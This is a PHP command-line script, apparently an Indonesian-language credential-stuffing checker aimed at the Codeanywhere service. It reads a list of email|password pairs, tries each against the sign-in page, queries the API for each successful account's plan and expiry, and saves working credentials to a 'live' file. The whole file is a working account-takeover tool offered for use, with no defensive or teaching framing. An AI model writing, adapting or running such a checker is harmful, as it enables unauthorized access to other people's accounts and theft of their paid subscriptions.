<?php
error_reporting(0);
echo "List Empas : ";
$xyz = trim(fgets(STDIN));
echo "\n";
foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
 	$pecah = explode("|", trim($akun));
	$email = trim($pecah[0]);
	$passwd = trim($pecah[1]);

$mmq = curl('https://codeanywhere.com/signin', null, null);
$sid = ($mmq[2]['sid']);
$sails = ($mmq[2]['sails_sid']);

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Cookie: sid='.$sid.'; sails.sid='.$sails.'; _ga=GA1.2.515752818.1590008622; _gid=GA1.2.1441382021.1590008622; _gat=1';

$headers1 = array();
$headers1[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0';
$headers1[] = 'Cookie: sid='.$sid.'; sails.sid='.$sails.'; _ga=GA1.2.515752818.1590008622; _gid=GA1.2.1441382021.1590008622; versioncode=41; token='.$token.'';

$gas = curl('https://codeanywhere.com/signin', 'login_email='.$email.'&login_password='.$passwd.'', $headers);
if (strpos($gas[1], 'Invalid login')) {
		console::log ("[Gagal] $email | $passwd", 'red');
		sleep(1);
	} else {
		$token = ($gas[2]['token']);
$plan = curl('https://codeanywhere.com/editor', null, $headers1);

$plan1 = curl('https://ca6.codeanywhere.com/api/v6/user/userData?token='.$token.'&rand=0.22768259447102934', null, null);
		$json = json_decode($plan1[1], true);
		$username = $json['username'];
		$planname = $json['planname'];
		$lastexpire = $json['last_subscription']['expire'];
		$email = $json['email'];
				console::log("[Success Login] $email | $passwd | Plan : $planname | Last Expire : $lastexpire", 'green');
		fwrite(fopen("codeanywhere-live.txt", "a"), "$email | $passwd | Plan : $planname | Last Expire : $lastexpire\n");
	}
}

function curl($url,$post,$headers)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	$result = curl_exec($ch);
	// $header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
	$cookies = array();
	foreach($matches[1] as $item) {
	  parse_str($item, $cookie);
	  $cookies = array_merge($cookies, $cookie);
	}
	return array (
	$headers,
	$body,
	$cookies
	);
}

function nama()
	{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://ninjaname.horseridersupply.com/indonesian_name.php");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	$ex = curl_exec($ch);
	// $rand = json_decode($rnd_get, true);
	preg_match_all('~(&bull; (.*?)<br/>&bull; )~', $ex, $name);
	return $name[2][mt_rand(0, 14) ];
	}

	class Console {
 
    static $foreground_colors = array(
        'bold'         => '1',    'dim'          => '2',
        'black'        => '0;30', 'dark_gray'    => '1;30',
        'blue'         => '0;34', 'light_blue'   => '1;34',
        'green'        => '0;32', 'light_green'  => '1;32',
        'cyan'         => '0;36', 'light_cyan'   => '1;36',
        'red'          => '0;31', 'light_red'    => '1;31',
        'purple'       => '0;35', 'light_purple' => '1;35',
        'brown'        => '0;33', 'yellow'       => '1;33',
        'light_gray'   => '0;37', 'white'        => '1;37',
        'normal'       => '0;39',
    );
    
    static $background_colors = array(
        'black'        => '40',   'red'          => '41',
        'green'        => '42',   'yellow'       => '43',
        'blue'         => '44',   'magenta'      => '45',
        'cyan'         => '46',   'light_gray'   => '47',
    );
 
    static $options = array(
        'underline'    => '4',    'blink'         => '5', 
        'reverse'      => '7',    'hidden'        => '8',
    );

    static $EOF = "\n";

    /**
     * Logs a string to console.
     * @param  string  $str        Input String
     * @param  string  $color      Text Color
     * @param  boolean $newline    Append EOF?
     * @param  [type]  $background Background Color
     * @return [type]              Formatted output
     */
    public static function log($str = '', $color = 'normal', $newline = true, $background_color = null)
    {
        if( is_bool($color) )
        {
            $newline = $color;
            $color   = 'normal';
        }
        elseif( is_string($color) && is_string($newline) )
        {
            $background_color = $newline;
            $newline          = true;
        }
        $str = $newline ? $str . self::$EOF : $str;

        echo self::$color($str, $background_color);
    }
    
    /**
     * Anything below this point (and its related variables):
     * Colored CLI Output is: (C) Jesse Donat
     * https://gist.github.com/donatj/1315354
     * -------------------------------------------------------------
     */
    
    /**
     * Catches static calls (Wildcard)
     * @param  string $foreground_color Text Color
     * @param  array  $args             Options
     * @return string                   Colored string
     */
    public static function __callStatic($foreground_color, $args)
    {
        $string         = $args[0];
        $colored_string = "";
 
        // Check if given foreground color found
        if( isset(self::$foreground_colors[$foreground_color]) ) {
            $colored_string .= "\033[" . self::$foreground_colors[$foreground_color] . "m";
        }
        else{
            die( $foreground_color . ' not a valid color');
        }
        
        array_shift($args);

        foreach( $args as $option ){
            // Check if given background color found
            if(isset(self::$background_colors[$option])) {
                $colored_string .= "\033[" . self::$background_colors[$option] . "m";
            }
            elseif(isset(self::$options[$option])) {
                $colored_string .= "\033[" . self::$options[$option] . "m";
            }
        }
        
        // Add string and end coloring
        $colored_string .= $string . "\033[0m";
        
        return $colored_string;
        
    }
 
    /**
     * Plays a bell sound in console (if available)
     * @param  integer $count Bell play count
     * @return string         Bell play string
     */
    public static function bell($count = 1) {
        echo str_repeat("\007", $count);
    }
 
}	
